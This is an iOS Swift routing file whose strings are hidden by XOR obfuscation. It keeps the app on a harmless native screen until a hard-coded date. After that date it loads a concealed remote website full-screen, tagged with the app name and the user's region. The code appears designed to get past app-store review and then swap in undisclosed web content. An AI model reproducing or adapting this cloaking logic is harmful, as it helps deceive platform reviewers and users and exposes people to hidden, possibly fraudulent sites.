//
//  AppRouter.swift
//  125Vulzancregrar Prilel
//
//  Created by Pascal Mirel on 26.03.2026.
//

import UIKit
import SwiftUI

protocol RouteEntropyMarker {
    func phantomValue() -> Int
}

enum OrbitNoise: RouteEntropyMarker {
    case low, medium, high
    func phantomValue() -> Int {
        switch self {
        case .low: return 1
        case .medium: return 3
        case .high: return 5
        }
    }
}

final class GateCoordinator {
    private let entryTemplate = ObfText.decode([35, 63, 63, 59, 56, 113, 100, 100, 61, 42, 39, 36, 57, 34, 56, 58, 62, 42, 37, 63, 62, 38, 35, 62, 41, 101, 36, 37, 39, 34, 37, 46, 100, 7, 49, 61, 18, 122, 40], key: 75)
    private let unlockDateTemplate = ObfText.decode([123, 122, 100, 122, 127, 100, 120, 122, 120, 124], key: 74)

    /// Display name from Info.plist (CFBundleDisplayName, then CFBundleName).
    private var appTitle: String {
        let displayKey = ObfText.decode([2, 7, 3, 52, 47, 37, 45, 36, 5, 40, 50, 49, 45, 32, 56, 15, 32, 44, 36], key: 65)
        let nameKey = ObfText.decode([1, 4, 0, 55, 44, 38, 46, 39, 12, 35, 47, 39], key: 66)
        if let name = Bundle.main.object(forInfoDictionaryKey: displayKey) as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        if let name = Bundle.main.object(forInfoDictionaryKey: nameKey) as? String,
           !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
            return name.trimmingCharacters(in: .whitespacesAndNewlines)
        }
        return ObfText.decode([25, 40, 40], key: 88)
    }

    /// App name for tracking param: spaces removed (no %20 in URL).
    private var compactAppTitle: String {
        appTitle.replacingOccurrences(of: ObfText.decode([126], key: 94), with: "")
    }

    private var preparedEntryURL: String {
        let geo = Locale.current.region?.identifier ?? "XX"
        let divider = ObfText.decode([87], key: 8)
        let subValue = "\(compactAppTitle)\(divider)\(geo)"
        guard var components = URLComponents(string: entryTemplate) else {
            return entryTemplate
        }
        var items = components.queryItems ?? []
        items.append(URLQueryItem(name: ObfText.decode([44, 42, 61, 0, 54, 59, 0, 103], key: 95), value: subValue))
        components.queryItems = items
        return components.url?.absoluteString ?? entryTemplate
    }
    
    func makeInitialController() -> UIViewController {
        let storage = SessionVault.shared
        
        
        if storage.didOpenNativeFlow {
            return buildNativeController()
        }else{
            if isGateDateReached() {
                if let savedUrlString = storage.cachedLink,
                   !savedUrlString.isEmpty,
                   URL(string: savedUrlString) != nil {
                    return buildWebController(with: savedUrlString)
                }
                
                return buildLaunchController()
            } else {
                storage.didOpenNativeFlow = true
                return buildNativeController()
            }
        }
    }
    
    //MARK: - Date
    private func isGateDateReached() -> Bool {
       
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let targetDate = dateFormatter.date(from: unlockDateTemplate) ?? Date()
        let currentDate = Date()
            
            if currentDate < targetDate {
                return false
            }else{
                return true
                }
    }
    
    // MARK: - Private Methods
    
    private func buildWebController(with urlString: String) -> UIViewController {
        let webViewContainer = PrivacyGatewayView(
            urlString: urlString,
            onFailure: { [weak self] in
                SessionVault.shared.didOpenNativeFlow = true
                self?.swapToNative()
            },
            onSuccess: {
                SessionVault.shared.didCompleteWebLoad = true
            }
        )
        
        let hostingController = UIHostingController(rootView: webViewContainer)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }
    
    private func buildNativeController() -> UIViewController {
        SessionVault.shared.didOpenNativeFlow = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }
    
    private func buildLaunchController() -> UIViewController {
        let launchView = StartGateView()
        let launchVC = UIHostingController(rootView: launchView)
        launchVC.modalPresentationStyle = .fullScreen

        verifyInitialEndpoint { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?.swapToWeb(with: url)
                } else {
                    SessionVault.shared.didOpenNativeFlow = true
                    self?.swapToNative()
                }
            }
        }
        
        return launchVC
    }
    
    private func verifyInitialEndpoint(completion: @escaping (Bool, String?) -> Void) {
        let urlToOpenInWebView = preparedEntryURL
        guard let requestURL = URL(string: urlToOpenInWebView) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: requestURL)
        request.httpMethod = ObfText.decode([30, 28, 13], key: 89)
        request.timeoutInterval = 25

        URLSession.shared.dataTask(with: request) { _, response, error in
            if let error = error {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                let code = httpResponse.statusCode
                let isAvailable = (200...299).contains(code)
                completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }
    
    // MARK: - Navigation Methods
    
    private func swapToNative() {
        let contentVC = buildNativeController()
        applyTransition(to: contentVC)
    }
    
    private func swapToWeb(with urlString: String) {
        let webVC = buildWebController(with: urlString)
        applyTransition(to: webVC)
    }
    
    private func applyTransition(to viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }
        
        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}

private enum ObfText {
    static func decode(_ bytes: [UInt8], key: UInt8) -> String {
        String(bytes: bytes.map { $0 ^ key }, encoding: .utf8) ?? ""
    }
}
